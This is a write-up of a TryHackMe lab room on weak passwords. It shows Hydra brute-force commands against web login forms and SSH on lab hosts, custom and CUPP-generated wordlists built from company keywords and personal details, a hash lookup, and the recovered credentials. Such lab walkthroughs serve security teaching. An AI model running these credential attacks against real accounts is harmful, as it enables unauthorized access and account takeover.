
# Checkmate

Room: https://tryhackme.com/room/checkmate

## Initial Setup

First, I added the target hostnames to `/etc/hosts` so they would resolve correctly.

```bash
echo "10.48.140.145 firewall.thm jobs.thm social.thm" | sudo tee -a /etc/hosts
```

The room consists of five levels, each demonstrating a different weak password practice.


## Level 1 - Default Credentials

The first challenge stated:

> Marco deployed a firewall at firewall.thm:5001 but kept default credentials.

Since the hint explicitly mentioned default credentials, I used Hydra with SecLists' default password list.

```bash
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt firewall.thm -s 5001 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Hydra successfully found the credentials:

```
host: firewall.thm
login: admin
password: 12345
```

Submitting the password completed Level 1.


## Level 2 - Company Keywords

The second challenge stated:

> Marco built an internal Employee Login panel on jobs.thm:5002 and used common company keywords as passwords.

Browsing the careers page revealed several repeated keywords:

```
innovation
excellence
security
digital
cloud
future
talent
```

I created a small custom wordlist based on these terms.

```bash
cat > words.txt << EOF
innovation
excellence
security
digital
cloud
future
talent
mht
mhtlabs
innovation123
security123
cloud123
digital123
EOF
```

I then used Hydra against the employee login portal.

```bash
hydra -l marco -P words.txt jobs.thm -s 5002 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Hydra identified the password:

```
host: jobs.thm
login: marco
password: excellence
```


## Level 3 - Personal Information

The next challenge required deriving Marco's password using personal information found on the employee portal.

The profile contained the following details:

```
First Name: Marco
Surname: Bianchi
Nickname: marky
Birthdate: 14021995
```

To generate a targeted password list, I used CUPP.

```bash
python3 cupp.py -i
```

Entered information:

```
First Name: Marco
Surname: Bianchi
Nickname: marky
Birthdate: 14021995
```

This generated a custom wordlist containing likely password combinations.

I then used Hydra against the social platform.

```bash
hydra -l marco -P marco.txt social.thm -s 5003 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Hydra successfully found the password:

```
host: social.thm
login: marco
password: Bianchi2495
```


# Level 4 - Recovering the Original Filename

The challenge stated:

> Marco recently uploaded a new profile picture. The platform automatically renames uploaded files to the SHA256 hash of the original filename.

After logging into Marco's social account, I located the profile picture.

I opened the image in a new tab and copied the filename hash:

```
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
```

Since the original filename appeared to be based on a common word, I used an online hash lookup service to identify the original value.

The SHA256 hash was successfully reversed, revealing the original filename.

Submitting the recovered filename completed Level 4.


# Level 5 - Predictable Password Patterns

The final challenge required brute-forcing Marco's SSH password.

While browsing Marco's social profile, I discovered a post describing his password creation habits:

> I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark.

The keywords provided were:

```
security
excellence
innovation
digital
cloud
```

Based on this pattern, I generated a custom wordlist.

```fish
for k in Security Excellence Innovation Digital Cloud
    for y in (seq 2020 2026)
        echo "$k$y!"
    end
end > ssh.txt
```

This created passwords such as:

```
Security2024!
Innovation2024!
Cloud2025!
Digital2026!
```

I then brute-forced the SSH service.

```bash
hydra -l marco -P ssh.txt ssh://10.48.140.145
```

Hydra successfully identified the password:

```
host: 10.48.140.145
login: marco
password: Security2024!
```

